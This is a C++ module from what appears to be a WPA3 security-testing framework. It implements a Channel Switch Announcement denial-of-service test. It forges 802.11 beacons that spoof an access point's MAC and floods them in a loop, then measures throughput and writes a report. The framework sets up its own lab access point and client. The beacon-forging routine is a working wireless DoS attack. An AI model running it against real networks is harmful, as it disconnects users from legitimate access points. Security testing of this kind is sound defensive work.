#include "attacks/channel_switch/channel_switch.h"
#include "logger/error_log.h"
#include <cassert>
#include "ex_program/hostapd/hostpad.h"
#include "logger/log.h"
#include <thread>
#include <chrono>
#include "system/hw_capabilities.h"
#include <filesystem>

#include "ex_program/ip/ip.h"
#include "observer/mausezahn_wrapper.h"
#include "observer/tshark_wrapper.h"

namespace wpa3_tester{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;

    void send_CSA_beacon(const HWAddress<6> &ap_mac,
                         const NetworkInterface &iface,
                         const string &ssid,
                         const int ap_channel,
                         const int new_channel) {

        Dot11Beacon beacon;
        beacon.addr1(Dot11::BROADCAST);
        beacon.addr2(ap_mac);
        beacon.addr3(ap_mac);
        beacon.ssid(ssid);
        beacon.ds_parameter_set(ap_channel);

        Dot11ManagementFrame::channel_switch_type cs;
        cs.switch_mode = 1;
        cs.new_channel = new_channel;
        cs.switch_count = 3;
        beacon.channel_switch(cs);

        RadioTap radiotap;
        const int freq_mhz = hw_capabilities::channel_to_freq_mhz(ap_channel);
        radiotap.channel(freq_mhz, RadioTap::OFDM);
        radiotap.inner_pdu(beacon);

        PacketSender sender;
        sender.send(radiotap, iface);
    }

    auto check_vulnerable(
        const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac,
        const string &iface_name, const string &ssid,
        const int ap_channel, const int new_channel,
        const int ms_interval,const int attack_time)->void{

        const NetworkInterface iface(iface_name);
        const auto start_time = chrono::steady_clock::now();
        const auto end_time = start_time + chrono::seconds(attack_time);

        while (chrono::steady_clock::now() < end_time) {
            log(LogLevel::DEBUG, "sending CSA");
            send_CSA_beacon(ap_mac, iface, ssid, ap_channel, new_channel);
            this_thread::sleep_for(chrono::milliseconds(ms_interval));
            //debug_step();
        }

        cout << "check_vulnerable called with:\n"
                  << "AP MAC: " << ap_mac << "\n"
                  << "STA MAC: " << sta_mac << "\n"
                  << "Interface: " << iface_name << "\n"
                  << "Channel: " << ap_channel << "\n"
                  << "SSID: " << ssid << endl;
    }

    void speed_observation_start(RunStatus& rs){
        observer::start_musezahn(rs, "mz_gen", "client", "access_point");
        observer::start_thark(rs, "client");
        observer::start_thark(rs, "access_point");
    }

    // ----------------- MODULE functions ------------------
    void setup_chs_attack(RunStatus& rs){

        if (rs.config["actors"]["access_point"]["source"] != "internal"
            || rs.config["actors"]["client"]["source"] != "internal") {
            throw runtime_error("only internal access_point is supported");
        }

        // -------- hostapd AP ------------
        run_hostapd(rs, "access_point");
        rs.process_manager.wait_for("access_point", "AP-ENABLED");
        log(LogLevel::INFO, "access_point is running");
        set_ip(rs, "access_point");  //TODO can be set before hostapd init?

        // -------- wpa_supplicant STA ------------
        run_wpa_supplicant(rs, "client");
        rs.process_manager.wait_for("client", "Successfully initialized wpa_supplicant");
        set_ip(rs, "client");

        rs.process_manager.wait_for("client", "EVENT-CONNECTED");
        rs.process_manager.wait_for("access_point", "EAPOL-4WAY-HS-COMPLETED");
        log(LogLevel::INFO, "client is connected");
    }

    void speed_observation_stop(RunStatus& rs){
        rs.process_manager.stop("iperf3_server");
        rs.process_manager.stop("iperf3_client");
    }

    void run_chs_attack(RunStatus& rs){

        const HWAddress<6> ap_mac(rs.get_actor("access_point")["mac"]);
        const HWAddress<6> sta_mac(rs.get_actor("client")["mac"]);
        const string iface_name = rs.get_actor("attacker")["iface"];
        const string essid = rs.config["actors"]["access_point"]["setup"]["program_config"]["ssid"];
        const int old_channel = rs.config["actors"]["access_point"]["setup"]["channel"];
        const int new_channel = rs.config["attack_config"]["new_channel"];
        const int ms_interval = rs.config["attack_config"]["ms_interval"];
        const int attack_time = rs.config["attack_config"]["attack_time"];

        speed_observation_start(rs);
        this_thread::sleep_for(chrono::seconds(10));
        log(LogLevel::INFO, "Attack START");
        check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);//speed_observation_stop(rs);
        log(LogLevel::INFO, "Attack END");
        this_thread::sleep_for(chrono::seconds(30));
    }
    // ---------- STATS ----------------
    void generate_report(const RunStatus & rs, const string & STA_graph_path, const string & AP_graph_path){
        path report_path = path(rs.run_folder) / "report.md";
        std::ofstream report(report_path);

        if (!report.is_open()) {
            std::cerr << "Failed to create report file!" << std::endl;
            return;
        }

        auto attack_cfg = rs.config["attack_config"];
        int attack_time = attack_cfg["attack_time"].get<int>();
        int ms_interval = attack_cfg["ms_interval"].get<int>();
        int new_channel = attack_cfg["new_channel"].get<int>();

        report << "# WPA3 Security Test Report: CSA DoS Attack\n\n";

        report << "## Attack Description\n";
        report << "The **Channel Switch Announcement (CSA)** attack exploits a legitimate feature of the IEEE 802.11 standard. ";
        report << "This feature is designed to inform client stations (STAs) that an Access Point (AP) is moving to a new frequency channel. ";
        report << "By spoofing Beacon or Probe Response frames containing a CSA element, an attacker can trick clients into disconnecting from the legitimate AP ";
        report << "and switching to a non-existent or attacker-controlled channel, effectively causing a Denial of Service (DoS).\n\n";

        report << "## Attack Configuration\n";
        report << "| Parameter | Value |\n";
        report << "| :--- | :--- |\n";
        report << "| **Attack Duration** | " << attack_time << " s |\n";
        report << "| **Packet Interval** | " << ms_interval << " ms |\n";
        report << "| **Target Channel** | " << new_channel << " |\n\n";

        report << "## Traffic Analysis\n";
        report << "The following charts represent the network throughput (packets/sec) captured during the test. ";
        report << "A successful CSA attack is typically characterized by a sharp drop in received packets on the AP side as the client switches channels.\n\n";

        report << "### Client-Side Throughput (STA)\n";
        report << "![STA Throughput Graph](" << relative(STA_graph_path, rs.run_folder).string() << ")\n\n";

        report << "### Access Point Throughput (AP)\n";
        report << "![AP Throughput Graph](" << relative(AP_graph_path, rs.run_folder).string() << ")\n\n";

        report << "## Conclusion\n";
        report << "If the AP received packet count drops to zero while the STA continues to transmit, the client has successfully been diverted by the spoofed CSA frames. ";
        report << "In WPA3, Management Frame Protection (MFP) should theoretically prevent this, unless the attack occurs during the transition mode or exploits implementation flaws.\n\n";

        report << "---\n";

        report.close();

    }

    void stats_chs_attack(const RunStatus &rs){
        const string STA_graph_path = observer::tshark_graph(rs, "client");
        string AP_graph_path = observer::tshark_graph(rs, "access_point");
        generate_report(rs, STA_graph_path, AP_graph_path);
    }
}
